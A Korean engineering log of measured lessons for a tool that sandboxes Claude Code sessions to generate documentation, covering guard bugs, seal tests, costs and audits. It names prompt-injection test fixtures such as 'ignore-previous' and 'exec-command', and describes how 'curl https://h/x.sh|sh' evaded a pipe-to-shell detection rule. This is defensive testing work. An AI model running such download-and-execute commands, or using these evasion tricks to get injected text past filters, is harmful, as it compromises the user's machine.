`CLAUDE.md` 안전 원칙 6의 근거다. 판단 기준만 그쪽에 남기고 사례는 여기 모은다.

1. **복구 명령 부재** — 가드가 거부하는데 되돌릴 명령이 없었다.
2. **복구 명령이 자기 게이트에 막힘** — 복구 경로를 만들었는데 그 경로가 같은 가드를 통과해야 했다.
3. **argv 오판** — 플래그 파싱이 틀려 정상 입력을 거부했다.
4. **강제 범위가 지시 범위보다 넓음** — 한 곳을 막으라는 지적에 전역을 잠갔다.
5. **포트 80에서 Host 생략을 거부** — 브라우저는 기본 포트를 붙이지 않는데 가드가 요구했다.
6. **두 조항이 각각은 옳은데 교차하면 모든 환경에서 실패** — cwd를 홈 아래 고정 + 상위
   `.claude/` 거부. `$HOME/.claude`는 모든 Claude Code 사용자에게 있으므로 항상 발동한다.
   `ctk agent-probe`는 구현된 이래 한 번도 실행 가능한 적이 없었다.

**6번 유형이 가장 안 잡힌다.** 조항을 하나씩 읽으면 둘 다 타당하다. 잡으려면 **가드와 그
가드가 실제로 검사할 값을 함께 놓고** 봐야 한다 — 프로덕션 기본값을 대입해 보는 것이 그 방법이다.

## ⓓ-2 실행형 봉인 테스트 4신호 전부 통과 (릴리스 게이트, 2026-08-23 실측)

`claude` 2.1.239, `sealed-live` 프로파일. `ctk verify seal`로 유료 세션 3회.

| 신호 | 결과 |
|---|---|
| 양성 대조군(`--append-system-prompt`로 주입한 문자열을 모델이 "봤다"고 답하는가) | 통과 |
| (i) SessionStart 훅 마커 미생성 | 통과 (대조군 확인됨) |
| (ii) 실제 `~/.claude/CLAUDE.md`의 고유 문자열이 컨텍스트에 부재 | 통과 |
| (iii) 설치 플러그인 슬래시 커맨드 미인식 | 통과 |

**`--safe-mode`가 훅·user CLAUDE.md·설치 플러그인을 실제로 차단한다는 것이 실세션으로
확인됐다.** `verified_cli_version`이 2.1.239로 갱신됐다.

### (i)은 이 실측 직전까지 **아무것도 증명하지 않았다**

`hookMarkerAbsent = !existsSync(marker)`인데 **그 마커를 만드는 것이 아무 데도 없었다** —
사용자 실제 `settings.json`에 SessionStart 훅이 1개 있었지만 이 경로를 쓰지 않았다(문자열
0건). 봉인이 되든 안 되든 항상 `true`였다. 코드는 (ii)에 대해서는 대조군을 강제하면서 (i)에는
같은 논리를 적용하지 않고 있었다.

**대조군을 세우는 절차(1회성, 사용자 승인 필요):**

1. `~/.claude/settings.json` 백업 → sha256 기록
2. `SessionStart` 배열에 `{"matcher":"*","hooks":[{"type":"command","command":"/usr/bin/touch <cwd>/.ctk-seal-hook-marker"}]}` **추가**(기존 훅은 건드리지 않는다)
3. **0원 대조군** — 그 명령을 셸에서 직접 실행해 마커가 생기는지 확인 후 삭제. 배선만 확인하고
   명령 동작을 확인하지 않으면 오타 하나가 거짓 통과가 된다
4. `ctk verify seal --max-budget-usd 0.50 --timeout-sec 180 --installed-plugin-command <커맨드>`
5. 백업본으로 복구 → **sha256 재확인**(착수 전과 동일해야 한다) → 마커·백업본 삭제

`sealed-live` cwd는 고정 경로(`~/.cache/ctk/sealed-cwd`)이므로 **이전 실행의 마커가 남는다** —
`verify seal`이 실행 전에 지운다. 안 지우면 이번 판정이 지난번 잔재로 실패한다.

### ⚠️ `settings.json`에 평문 크레덴셜이 있을 수 있다

이 절차 중 실측으로 확인했다 — `env` 블록에 GitHub PAT가 평문으로 들어 있었다.
**이 파일을 다루는 코드·절차는 내용을 절대 출력·복사·커밋하지 않는다.** 백업본을 만들면
그 사본에도 크레덴셜이 들어가므로 절차가 끝나면 **반드시 삭제**한다.

## AC-3.9 LLM 경로 게이트 통과 + 하네스가 인증을 죽이는 조합 (2026-08-23 실측)

악성 픽스처 5종을 **실제 모델**에 통과시킨 결과. `claude` 2.1.239 · `sealed-live`.

| 픽스처 | 결과 | spawn | 모델 stdout |
|---|---|---|---|
| ⓐ ignore-previous | `stale` / `injection_pattern_detected` | 1회 | 5,448B |
| ⓑ system-tag | 〃 | 1회 | 4,881B |
| ⓒ delimiter-escape | 〃 | 1회 | 8,180B |
| ⓓ exec-command | 〃 | 1회 | 6,672B |
| ⓔ outside-whitelist-url | 〃 | 1회 | 5,597B |

**5종 전부 `output-verify`가 `sync` 쓰기 이전에 거부했고, 봉투의 실제 구획자는 산출물로 새지
않았다.** 카탈로그 인덱스에 `generated`로 등재된 것은 0건이다.

⚠️ 이 게이트는 **의미적 유도**(모델이 패턴 없이 내용만 기울이는 경우)를 재지 않는다. 통과가
그것까지 안전하다는 뜻이 아니다.

### 테스트 하네스가 인증을 죽이는 조합

`index.test.ts`의 스캐폴딩(임시 `HOME` + `configDirExplicit: true`)을 **실제 spawn에 그대로
쓰면 5회가 4.47초에 전부 exitCode 1로 끝난다** — `CLAUDE_CONFIG_DIR` 설정이 OAuth를 깨고
임시 홈에는 크레덴셜이 없다. 스텁 spawn을 쓰는 파일에서는 이 조합이 드러나지 않는다.

**해소**: `mcp`/`cli` 자산을 쓴다. 이 종류의 원문은 `asset.description`이고 그건 임시 카탈로그에서
온다(`source-resolve.ts`의 `descriptionOnlySource`) — `home`은 실제 홈 그대로라 인증이 살고
사용자 환경에는 아무것도 쓰지 않는다. `skill`·`plugin`은 원문을 `home` 아래 파일에서 읽으므로
합성 원문을 넣으려면 사용자 실제 config dir에 써야 한다.

**소요 시간이 곧 실행 여부의 신호다** — 5회 유료 호출은 6~8분이 걸린다(케이스당 72~89초).
초 단위로 끝났으면 모델은 돌지 않은 것이다.

### 유료 게이트의 출력은 첫 실행에서 다 받는다

기본 vitest 리포터는 `console.log`를 요약에 싣지 않는다. 관측 상세를 보려고 재실행하면
**유료 호출 5회가 통째로 반복된다**(실제로 그렇게 써서 알린 5회가 11회가 됐다).
`release:ac39` 스크립트에 `--reporter=verbose`를 박아 첫 실행에서 케이스별 판정이 나오게 했다.

## "방어를 만들었지만 모든 경로에 배선하지 않은" 사례 7종 (누적, 2026-08-20~23)

`CLAUDE.md` 안전 원칙 5의 근거다. 판단 기준만 그쪽에 남기고 사례는 여기 모은다.
**매번 "이미 막았다"고 믿은 자리였다.**

1. **경로 순회** — "막았다"가 한 필드만 막은 것이었다.
2. **단일 관문 통합** — 3층 중 2층만 통합됐다.
3. **`main`과 `bin`** — `main`을 고치고 같은 파일의 `bin`은 그대로 둬 실행 파일이 죽어 있었다.
4. **Origin 관문** — 만들어 놓고 **액션 분기에만 배선해** 조회 경로가 무방비였다.
5. **managed 정책 탐지기** — `core`·`probe`에 다 있고 `gen`이 게이트로 쓰는데, 계획서가 지정한
   **조회 경로(`ctk doctor --managed-policy`)에는 존재하지 않았다.** 사용자가 "내 환경에 managed
   정책이 있나"를 물을 방법이 없었다.
6. **봉인 신호의 양성 대조군** — (ii)에는 대조군을 강제하면서 **(i)에는 같은 논리를 적용하지
   않았다.** 주석에 그 논리가 적혀 있는데도 옆 축에는 없었다. 그 결과 (i)은 봉인 여부와
   무관하게 항상 통과였다.
7. **`readManagedPolicies`의 `parseFailures`** — 함수는 돌려주는데 호출부가 `.policies`만 꺼내
   써서 깨진 정책 파일이 "정책 없음"과 같은 판정을 받았다. **두 호출부 중 한 곳만 고치면 같은
   결함이 남는다.**

**5·6·7은 전부 같은 세션에서 나왔다.** 공통점은 "만든 사람과 배선한 사람이 같은데도 놓쳤다"는
것이다 — 만들 때는 한 경로만 눈앞에 있기 때문이다. 방어를 추가하면 **그것을 쓸 수 있는 경로를
전부 열거해** 각각 배선했는지 본다.

## AC-3.5(수동) — 스폰 메타데이터대로 실제 스폰 시도 (2026-08-23 실측)

계획서 §6의 `[manual]` 릴리스 게이트. **자동화하면 자기 참조가 되므로**(ctk가 자기 산출물을
파싱해 자기가 실행하면 추출기를 추출기로 검사하는 꼴이다) 사람이 문서를 읽고 직접 타이핑한다.

⚠️ 이 저장소는 public이므로 **대상 자산의 정체는 적지 않는다** — 설치된 툴 이름은 개인 환경
데이터다. 측정 방법과 결과만 남긴다.

### 절차 (실제로 밟은 것)

1. `ctk gen`이 만든 `usage.md`를 연다
2. 「커맨드」 절의 호출 문자열을 **복사**한다 — 기억해서 치거나 고쳐 치면 검증이 아니다
3. 실제 Claude Code 세션에 그대로 입력한다
4. 커맨드가 **인식되고 스킬이 로드되는지**만 본다(끝까지 진행할 필요 없다)
5. 문서가 제시한 커맨드 전체와 플러그인에 실제 존재하는 것을 **문자열 대조**한다

### 결과 — 공개 마켓플레이스 플러그인 1건

| 항목 | 값 |
|---|---|
| 라이브 스폰 | **성공** — 문서 문자열 그대로 입력해 스킬이 로드됨 |
| 문서가 제시한 커맨드 | 9개 |
| 플러그인에 실제 존재 | 10개 |
| 문서 → 실제 매칭 | **9/9 (허위 0건)** |
| 실제 → 문서 누락 | 1건 |

**허위 커맨드 0건**이 핵심 결과다. 문서가 지어낸 호출 이름이 하나도 없었다.

### 누락 1건은 설계대로다 — 완전성과 검증가능성의 맞바꿈

문서에 빠진 커맨드 1건은 **원본 README에도 없었다**(등장 0회). `gen`은 `[[cite:README.md#Lx-Ly]]`로
원본 라인을 인용하며 만들므로 **원본에 없는 것을 지어낼 수 없다.**

파일시스템을 훑어 스킬 디렉터리를 열거했다면 10개가 다 나왔겠지만 **인용을 붙일 수 없어
P5(인용 강제)를 위반한다.** 즉 이 설계는 완전성 대신 검증가능성을 택했고, 그 대가가 이
누락이다. **사용자가 알아야 할 사실이지 고칠 버그가 아니다** — 문서는 인용한 원본만큼만
완전하다.

### 미측정으로 남은 것

**스킬 경로**(자연어 트리거로 발동하는 자산)는 재지 않았다. 플러그인 스킬이 이미 로드된
세션에서는 컨텍스트가 섞여 판정이 흐려지기 때문이다 — 새 세션에서 별도로 재야 한다.
AC-3.5는 **플러그인 경로에서만 통과**했다고 적는다(안전 원칙 7).

---

## count_tokens 크레덴셜은 `ANTHROPIC_API_KEY`가 아니다 (2026-08-24 실측)

`@anthropic-ai/sdk`는 크레덴셜을 **네 단계로 해석**한다 — `ANTHROPIC_API_KEY` →
`ANTHROPIC_AUTH_TOKEN` → `ant auth login` 프로파일 → Workload Identity Federation.
따라서 **env 하나만 보고 "크레덴셜 없음"으로 판정하면 틀린다.**

`claude` CLI의 구독(claude.ai) OAuth와는 **별개 표면이다.** 실측 확인:

| | 인증 주체 | 표면 |
|---|---|---|
| `ctk measure` (Node SDK) | env · `ant` 프로파일 · WIF | `platform.claude.com` (Console API) |
| `ctk gen` (`claude -p`) | macOS 키체인 OAuth | `claude.ai` 구독 |

### `ant auth login`은 `claude`의 인증을 빼앗지 않았다

공식 문서는 "Claude Code may warn about an auth conflict"라고 경고하지만, **이 조합에서는
재현되지 않았다.** `ant auth login --profile <name>`이 활성 프로파일로 승격된 뒤에도
`claude auth status --json`은 4개 필드가 전부 그대로였다(`loggedIn` · `authMethod:"claude.ai"` ·
`apiProvider:"firstParty"` · `subscriptionType`), org id도 구독 조직 그대로였다.

**관측 방법**: 로그인 **전에** `claude auth status --json`으로 베이스라인을 뜨고 로그인 직후
대조한다. 대조군 없이는 "바뀌지 않았다"를 말할 수 없다.

### 커밋 없이 계정을 탐침하는 법

`ant auth login --no-browser`는 authorize URL을 출력하고 코드를 기다린다. **코드를 되돌려주기
전까지 로컬에 아무것도 쓰지 않는다** — 실측으로 `~/.config/anthropic`에 파일 0건을 확인했다.
"Creating profile" 메시지가 떠도 영속되지 않는다. 계정에 API 조직이 있는지만 확인하고 싶을 때
쓸 수 있다.

⚠️ `ant auth status`는 **로그인 전에는 계정을 볼 수 없다** — Organization이 "Derived from
credential (server-side)"로 나온다. 로컬 프로파일 설정 상태만 보고하므로 "이 계정에 API 접근이
있나"의 판정 근거가 되지 못한다(**가드와 그 가드가 검사할 값이 다른 축이었던 사례**).

### macOS 설치 함정

`brew install anthropics/tap/ant` 직후 실행하면 Gatekeeper 격리로 **SIGKILL(exit 137)** 이
나고 stdout·stderr 모두 비어 있다. `xattr -d com.apple.quarantine <caskroom 실경로>`가 필요하다
(공식 설치 절차에 포함). **출력이 전혀 없으면 종료 코드부터 본다** — 137은 "명령이 조용히
실패"가 아니라 "커널이 죽였다"다.

## TLS 가로채기 회선에서 Node SDK가 실패한다 (2026-08-24 실측)

기업 네트워크의 TLS 가로채기 프록시가 있는 회선에서 `@anthropic-ai/sdk` 호출이
`APIConnectionError: Connection error.`로 실패한다. 원인은 `SELF_SIGNED_CERT_IN_CHAIN`이다 —
프록시의 루트 CA는 **macOS 키체인에 있지만 Node의 번들 CA 저장소에는 없다.**

**Go로 작성된 `ant` CLI는 같은 회선에서 정상 동작한다**(시스템 신뢰 저장소를 쓴다).
따라서 "`ant`는 되는데 `ctk measure`는 안 된다"가 크레덴셜 문제로 오독되기 쉽다.

- **판별**: `openssl s_client -connect api.anthropic.com:443` 의 발급자(`i:`)가 공인 CA가
  아니면 가로채기 회선이다. `curl`도 exit 60으로 함께 실패한다
- **해결**: 루트 CA를 PEM으로 내보내 `NODE_EXTRA_CA_CERTS`로 지정한다.
  **`NODE_TLS_REJECT_UNAUTHORIZED=0`을 쓰지 않는다** — 검증을 끄는 것과 신뢰 CA를 하나
  추가하는 것은 다르다
- **오류 형태**: 원인 코드는 `err.cause.code`가 아니라 **두 겹 아래**에 있다 —
  `APIConnectionError("Connection error.")` → `TypeError("fetch failed")` → `{code}`.
  한 겹만 보는 분류기는 이 케이스를 조용히 놓친다

## 한국어 텍스트의 토큰 단가 (2026-08-24 실측, `claude-sonnet-4-5-20250929`)

| 텍스트 | 문자 | 토큰 | 문자당 |
|---|---|---|---|
| 한국어 설명문 | 84자 | 89 | 1.06 |
| 같은 뜻의 영어 | 105자 | 36 | 0.34 |

**한국어가 문자당 약 3배의 토큰을 쓴다.** 상시 로드되는 텍스트(스킬 `description`,
에이전트 지시문)에 토큰 상한이 걸려 있으면 **언어 선택이 곧 예산 문제**가 된다 —
`toolkit-search`의 AC-3.1(상한 60)이 한국어로는 물리적으로 빠듯했고 영어로 바꾸자
89 → 36으로 떨어지면서 정보량은 오히려 늘었다.

**본문에는 해당하지 않는다** — 상시 로드되지 않는 텍스트는 이 제약을 받지 않는다.


## 봉인 트리 감사와 동시 세션 (2026-08-24 실측)

`ctk gen`은 `claude -p` 스폰 전후로 `CLAUDE_CONFIG_DIR` 전체를 트리 diff해 허용목록 밖 변경이
있으면 중단한다. 그런데 **그 디렉터리는 봉인된 자식만의 것이 아니다.**

### 관측

| 실행 위치 | 위반으로 잡힌 경로 | 실제 주체 |
|---|---|---|
| Claude Code 세션 **안** | `hooks/state/<부모 세션 uuid>.start` | 부모 세션 |
| 세션 **밖**, 대화는 계속 | `projects/<프로젝트>/<부모 세션 uuid>.jsonl` | 부모 세션 |
| 세션 밖 + 서브에이전트 스폰 | `projects/<프로젝트>/<uuid>/subagents/agent-*.jsonl` | 부모가 띄운 서브에이전트 |
| 세션 밖 | `security/log.txt` | **설치된 서드파티 플러그인의 훅** |
| Claude Code **완전 종료** | 없음 — 문서 5건 정상 생성 | — |

**배제 실험**: 40초 유휴 동안 변화 0건 · `claude --version`·`claude plugin list --json`으로도
변화 0건 · `plugins/*.json` 변경은 1회 관측 후 **재현되지 않음**(정황이 강해도 재현 없이는
결론이 아니다).

### 파급 — 열거로는 끝낼 수 없다

`security/log.txt`는 하네스가 아니라 **설치된 플러그인의 훅**이 쓴다. 사용자마다 설치가 다르니
경로도 다르고, 제품 코드에 열거하면 개인 환경 정보를 저장소에 박게 된다. 그래서 v1의 대응은
둘로 갈린다:

1. **세션 이름 공간**(`projects/<프로젝트>/<uuid>.jsonl` · `<uuid>/**` · `hooks/state/<uuid>.start`)
   은 귀속 불가로 제외한다 — 단 **`before`에서 이미 관측된 uuid**에만 적용하고, 크기가 줄어든
   (append가 아닌) 파일은 되돌린다. **신규 uuid의 등장은 봉인 파손의 1차 신호**이므로 위반으로
   남긴다(훅이 실행됐거나 자식이 세션을 영속했다는 뜻).
2. 나머지는 `--allow-concurrent-sessions` **명시적 옵트아웃**으로만 눈감는다. 그 플래그를 켠
   실행은 **config 감사가 사실상 무력**하며 run-log와 화면에 그렇게 기록된다.

### 귀속 미확정 — `.last-cleanup` (2026-08-24)

세션 이름 공간을 제외한 뒤에도 남은 위반은 `.last-cleanup` **하나**였다(4건 → 1건). 내용은 ISO
타임스탬프 한 줄이고, **`claude --version`·`claude plugin list --json`으로는 바뀌지 않는다** —
온전한 모델 세션만 쓴다.

**부모인지 봉인된 자식인지 가리지 못했다.** 이름이 시사하듯 주기적이라 즉시 재현되지 않아서,
"자식이 쓴다"를 실측으로 확인할 수 없었다. **추측으로 `TIER2_CHURN_ALLOWLIST_SEALED_LIVE`에
넣지 않는다** — 그 목록의 의미는 "실측된 자식 churn"이고, 재현 없이 넣으면 그 의미가 오염된다
(`plugins/*.json`을 정황만으로 결론짓지 않고 재현 실험으로 배제했던 것과 같은 판단).

가리려면 봉인 세션을 정리 주기 경계에 걸쳐 2회 이상 돌려 `.last-cleanup`이 자식 스폰 시각과
함께 움직이는지 봐야 한다. 그때까지는 `--allow-concurrent-sessions`가 이 한 건을 덮는다.

### 실측 소요 — 자산당 약 2분, 180초는 빠듯하다

파일럿(10건, Claude Code 종료 상태) 실측: **6회 호출 12분 6초 → 호출당 약 121초.** 117건 전량
외삽 시 **약 4시간**이다(자산별 원본 크기 편차가 있으므로 근사).

`--timeout-sec 180`은 이 구간에 걸쳐 있다 — 같은 자산이 어떤 실행에서는 완료되고 어떤
실행에서는 `seal_timeout`으로 죽었다(머신 부하·모델 지연 편차). **배치는 420초를 쓴다.**

⚠️ **타임아웃으로 죽으면 트리 감사에 도달하지 못한다.** spawn 이후에 감사가 돌기 때문이다 —
`whitelist_violation`이 사라졌다고 해서 감사를 통과한 것이 아니라, 거기까지 가지 않았을 수 있다
(같은 문서의 "가드가 막은 줄 알았던 400은 그 가드에 도달조차 못 한 오류였다"와 같은 형태).
**실패 문구가 바뀐 것을 고쳐졌다고 읽지 않는다 — 어느 단계에서 죽었는지를 본다.**

### 한 자산의 LLM 실패가 큐를 영구히 막았다 (2026-08-24)

`plan.ts`는 `gen_state: "stale"`인 자산을 **원본이 그대로여도 항상 대상에 넣는다**(직전 실행이
실패로 남긴 것). 그런데 `ClaudePCallFailedError`는 예산 실패가 아니면 **전체 실행을 중단**시켰다.

두 규칙이 맞물리면 **영구 차단**이 된다:

1. 자산 A가 실패 → `stale`로 기록
2. 다음 실행에서 A가 **항상 1순위**로 잡힘 → 또 실패 → 전체 중단
3. A 뒤의 자산은 **영영 처리되지 않음**

실측에서 자산 하나(`analyze-jd`)가 큐를 통째로 막았고, `--max-assets 1`은 매번 그것만 시도해
네 번 연속 실패했다. **E5.12가 위생 실패에 대해 이미 내린 판단**("거부는 옳지만 범위가 틀렸다 —
그 자산만 빼고 나머지는 처리한다")이 **LLM 호출 실패에는 적용돼 있지 않았다.**

v1 대응: LLM 호출 실패도 자산별 skip으로 축소한다. 단 **삼키지 않는다** — 사유(`call_failed`)와
진단을 결과에 남기고, `stale`로 기록해 다음 실행이 다시 시도하며, **한 건이라도 실패하면 CLI가
종료 코드 1**을 낸다(그러지 않으면 배치·CI가 "전부 성공"으로 읽는다).

### `claude -p` 실패 진단은 stdout에 온다 (2026-08-24)

`sealed-live`는 `--output-format json`을 쓴다. 그래서 실패 시 **stderr가 비고 사유가 stdout에
온다.** 실패 진단이 stderr만 싣고 있어 화면에는 `exitCode=1:` 뒤 빈 문자열만 남았고, **왜
실패했는지 알 수 없어 검증이 몇 시간 막혔다.**

stdout을 실어 보니 형태는 이랬다:

```
{"is_error":true, "num_turns":1, "stop_reason":"stop_sequence",
 "duration_api_ms":1563, "total_cost_usd":0.005043,
 "usage":{"input_tokens":0, "output_tokens":0, ...}}
```

부수 사실 둘: **실패한 호출도 과금된다**(`total_cost_usd`가 응답에 실려 온다). 그리고 **전체
소요(234초) 중 API는 1.5초뿐**이었다 — 나머지는 CLI 기동·정리 쪽이다.

### 일시적 — `--disable-slash-commands`가 봉인 세션을 멈췄다가 스스로 풀렸다 (2026-08-24, CLI 2.1.241)

**같은 날 같은 버전에서 동작이 갈렸다.** 10:53 `ctk verify seal`이 4신호를 10.3초에 통과했고
13:19 파일럿이 문서 5건을 생성했는데, 14:05 이후 모든 봉인 세션이 멈춘다.

base(`--safe-mode --no-session-persistence --strict-mcp-config --mcp-config '{"mcpServers":{}}'`)에
플래그를 하나씩 얹어 이분한 결과:

| 추가 플래그 | 소요 |
|---|---|
| (없음, `-p`만) | 14초 |
| `--max-budget-usd 0.5` | 4초 |
| `--tools ""` | 5초 |
| `--disallowedTools <목록>` | 4초 |
| `--setting-sources project` | 5초 |
| **`--disable-slash-commands`** | **35초 상한 초과(행)** |

`--help`상 이 플래그는 값을 받지 않는다(`Disable all skills`) — 인자를 먹는 문제가 아니다.

⚠️ **첫 이분은 틀린 답을 줬다.** 전체 argv에서 이 플래그만 뺀 대조군도 90초 행이었고,
그래서 "이 플래그가 원인이 아니다"로 읽을 뻔했다. **base를 고정해 하나씩 얹고 나서야** 갈렸다 —
관측이 흔들릴 때는 대조군을 고정한다.

부수 관측: 성공한 호출들도 프롬프트에 답하지 않고 **인사말**을 냈다. stdin 프롬프트가
전달되지 않는 상태이며, `gen` 실패 응답의 `input_tokens: 0`과 같은 뿌리로 보인다.

**약 1시간 50분 뒤 스스로 회복했다(15:58 실측, 5초 응답).** 14:05~15:50 사이 4회 재관측이
전부 40초 상한을 넘겼고, 그동안 코드·CLI 버전·argv 무엇도 바뀌지 않았다. **원인은 여전히
미상이다** — 코드 쪽 변경(트리 감사·에러 클래스)은 spawn 경로에 닿지 않아 배제되고, 남는
가설은 하네스 바깥(백엔드 상태·회선)이다.

⚠️ **이 항목을 "해결됨"으로 지우지 않는다.** 재현 조건을 모르는 채 사라진 고장은 다시 온다.
같은 증상이 보이면 **먼저 위 이분표대로 base를 고정해 하나씩 얹어 재현부터 확인하고**, 코드를
의심하기 전에 시간을 두고 재관측한다. 무료로 확인하는 방법:
`printf 'OK\n' | claude --safe-mode --no-session-persistence --strict-mcp-config --mcp-config '{"mcpServers":{}}' --disable-slash-commands -p`

### 부수 사실

- `hooks/state/`는 세션당 파일 1개가 **누적**된다(관측 시점 167개, 접미사는 전부 `.start`).
  파일명은 세션 uuid이고 하네스가 직접 쓴다 — 사용자 훅이 아니다.
- 서브에이전트 트랜스크립트는 `projects/<프로젝트>/<세션 uuid>/subagents/`에 있다 —
  메인 트랜스크립트보다 **한 단계 깊다**(E0.6과 같은 사실의 다른 얼굴).
- `collectTree`는 심볼릭 링크를 따라가지 않고 `entries`에서 뺀다. 따라서 **링크로 심은 파일은
  목록 diff에 나타나지 않는다** — `gen`은 `symlinkCount` 델타를 fail-closed로 쓴다.
  `emptyDirCount`는 쓰지 않는다(허용된 `sessions/<pid>.json` 생성만으로도 변해 오탐이 된다).
  `actuator`는 둘 다 쓰지 않는다 — 정상 조치가 디렉터리를 만들고 지우기 때문이다.
  **계층이 다르면 같은 신호의 의미도 다르다.**

## "원본 없음"은 한 가지가 아니다 — 사유 3종 실측 분해 (2026-08-24 실측)

`ctk gen`이 원문을 못 구한 자산 12건을 정밀 분류한 결과다. 관측 방법은 자산별로 `kind`에 따라
리졸버가 실제로 보는 것(스킬 디렉터리 목록 · 플러그인 installPath · `Asset.description`)을 그대로
재현해 세는 것이었다. **가설(드리프트냐 리졸버 결함이냐)은 둘 다 틀렸다.**

| 사유 | 건수 | 실체 |
|---|---|---|
| 드리프트(원본이 지워짐) | **0** | 하나도 없었다 |
| 중복 설치(같은 이름이 두 곳) | 6 | `SKILL.md` 해시가 **전부 일치** |
| 유형상 원문 부재(mcp·cli) | 6 | `description`이 유형 전체에서 **0%** |

**파급 1 — 축이 다르면 같은 신호도 다르게 읽어야 한다.** `findSkillDirsById`가 2건 이상을
거부하는 근거(H6)는 "어느 디렉터리를 **이동**시킬지 모른다"는 **쓰기 축**의 판단인데, `gen`은
읽기다. 바이트가 같은 두 사본 사이에는 읽기 축의 모호성이 없다. 같은 함수를 두 축이 공유하면서
한쪽의 안전 규칙이 다른 쪽에서 **과잉 차단**이 되고 있었다.

**파급 2 — 중복의 절반은 "복사"가 아니라 "같은 파일"이었다.** 6건 중 4건은 서로 다른 프로젝트에
복사된 실제 파일 두 개였지만, 2건은 `SKILL.md` 자체가 심볼릭 링크였다(디렉터리명만 다르고
frontmatter `name`이 같은 라우터 스킬 패턴 — 「스킬 `SKILL.md`가 심볼릭 링크인 경우가 흔하다」
참조). 해시 비교로는 "동일"이지만 **위생 검사가 먼저 막는다.** 링크가 아닌 사본을 골라 우회하지
않는 것이 옳다 — 안전 축에서는 가장 엄격한 판정을 취한다. 수정 후 실측: 대상 112 → **116**,
위생 거부 52 → **54**, 유형상 원문 부재 **6**, 최신 7 (합 183).

**파급 3 — `descriptionOnlySource`는 실환경에서 한 번도 성공한 적이 없다.** mcp 4건·cli 2건
전부 `description`이 비어 있었다. 로컬 설정(`.mcp.json` 등)에는 서버 설명 필드가 없고, 원문의
진짜 소재지는 카탈로그 밖이다 — MCP는 서버 런타임 instructions, CLI는 `--help`. 이것을
`source_missing`으로 분류하면 화면이 **실행 불가능한 조언**("드리프트인지 확인하라")을 한다.

## vm 컨텍스트에서 top-level `const`는 전역 객체 속성이 아니다 (2026-08-24 실측)

`vm.runInContext`로 UI 스크립트를 띄운 뒤 `ctx["UNRESOLVED_LABEL"]`로 값을 읽으려 하면
`undefined`다 — `var`·함수 선언과 달리 `const`/`let`은 전역 **렉시컬 환경**에만 산다.
같은 컨텍스트에서 식을 한 번 더 평가하면(`new vm.Script("UNRESOLVED_LABEL").runInContext(ctx)`)
그 바인딩이 보인다. **주입 상수를 실행으로 확인하려면 이 방법을 쓴다** — 문자열 검색은
"주입 코드가 있는가"만 답하고 "실행 시점에 닿는가"는 답하지 못한다.

## `--max-budget-usd`는 **사전 견적으로 호출을 거부**한다 (2026-08-24 실측)

`claude -p --max-budget-usd <N>`은 상한을 넘을 것으로 **예상되는** 호출을 아예 보내지 않는다.
30건 배치에서 관측된 실패 19건을 `duration_api_ms` · `usage` · `total_cost_usd`로 갈라 보면
세 갈래가 나온다:

| 갈래 | 건수 | duration | input/output 토큰 | 보고된 `total_cost_usd` |
|---|---|---|---|---|
| **사전 거부** | 15 | 1.3~1.9초 | **0 / 0** | 상한 초과값(= 견적) |
| 실행 후 초과 | 2 | 24.7초 · 34.9초 | 실제 값 | 상한 초과값(= 실비용) |
| 그 밖 | 2 | ~1.7초 | 0 / 0 | 상한에 **한참 못 미침** |

**파급 1 — 거부된 호출에는 돈이 나가지 않는다.** `output_tokens: 0`이 1.5초에 끝났다는 것은
모델이 돌지 않았다는 뜻이다(이 문서의 「유료·외부 호출은 소요 시간으로 검산한다」와 같은 판정).
따라서 **낮은 상한은 "비싼 자산을 건너뛰는 필터"로 동작한다** — 낭비가 아니다. 다만 그 자산들은
매 배치가 다시 시도하므로 상한을 올리지 않으면 영영 생성되지 않는다.

**파급 2 — 응답의 `total_cost_usd`는 두 가지를 뜻한다.** 실행된 호출에서는 실비용이고, 거부된
호출에서는 **보내지 않은 요청의 견적**이다. 둘을 구분하는 신호는 `usage`의 토큰 수다.
`is_error: true`인 실패 봉투에도 이 필드가 실리므로 실패분 비용도 읽을 수 있다.

**파급 3 — `stop_reason: "tool_use"`가 0토큰과 함께 오는 경우가 있다.** 토큰이 0인데
stop_reason이 있는 것은 앞뒤가 맞지 않는다 — 거부 응답이 필드를 채워 보내는 것으로 보인다.
**이 필드만 보고 "모델이 도구를 쓰려다 실패했다"로 읽으면 안 된다.**

세 번째 갈래(상한 미달 실패 2건)는 **원인 미상**이다. 예산과 무관하므로 "예산 초과"로 뭉개지
않고 재관측 대상으로 남긴다.

## `gen` 비용 견적이 실제의 약 1/20이었다 (2026-08-24 실측 · 수정 완료)

`estimateGenCost`가 `입력토큰 ÷ 1M × 단가`로 **입력 토큰만** 곱했고, 필드명이 `approxCostUsd`
("근사 비용")여서 그 값이 총비용으로 읽혔다. 출력 토큰과 캐시 생성이 빠져 있는데 실제로는
그쪽이 비용의 대부분이다.

**관측 방법**: 배치 로그의 `total_cost_usd` 분포와 승인 화면이 표시한 견적을 대조했다.
자산당 실측 중앙값은 견적의 약 20배였다.

**파급**: 계산이 아니라 **이름이 결함이었다.** 값 자체는 "입력분 비용"으로서 정확했고, 그것이
무엇인지 화면이 말하지 않은 것이 문제다. 지금은 **하한(입력만) · 상한(호출수 × 호출당 상한,
정확한 값) · 실측(이 머신의 지난 실행, 없으면 표시하지 않음)** 셋으로 갈라 보고한다.
실측 단가는 머신 종속이라 run-log에 쌓고 제품 코드에 상수로 박지 않는다.

## 인젝션 후검증에서 "거부"를 "제거"로 바꿀 때 생기는 결함 3종 (2026-08-24 실측 · 보안 심사)

허용 도메인 밖 URL을 **거부**에서 **제거 후 통과**로 바꾸자 세 결함이 생겼다. 전부 실측 재현했고,
공통 뿌리는 하나다 — **거부가 정규식의 엉성함을 가려주고 있었다.** 잘못된 부분을 매칭해도 결과가
"거부"라 티가 나지 않았고, 제거로 바꾸는 순간 매칭 정확도가 곧바로 결과가 됐다.

**① 제거가 다른 규칙의 토큰을 삼켰다.** URL 경로 문자 클래스에 `|`가 있어
`curl https://h/x.sh|sh`가 파이프와 `sh`까지 URL 한 덩어리로 매칭됐다. 제거하면 파이프가
사라져 `curl_pipe_shell` 규칙이 **매칭되지 않는다** — 인젝션 시도가 `fresh`로 커밋됐다.
우회 조건은 "파이프 앞 공백 없음" 하나뿐이고 그것은 흔한 셸 표기다.

> **근본 처방은 문자 클래스가 아니다.** 셸 메타문자를 경로에서 빼는 것만으로는 다음 문자에서
> 재발한다. **원문으로 지시문·실행명령을 먼저 판정하고, 그 다음 URL만 제거하고, 제거본으로
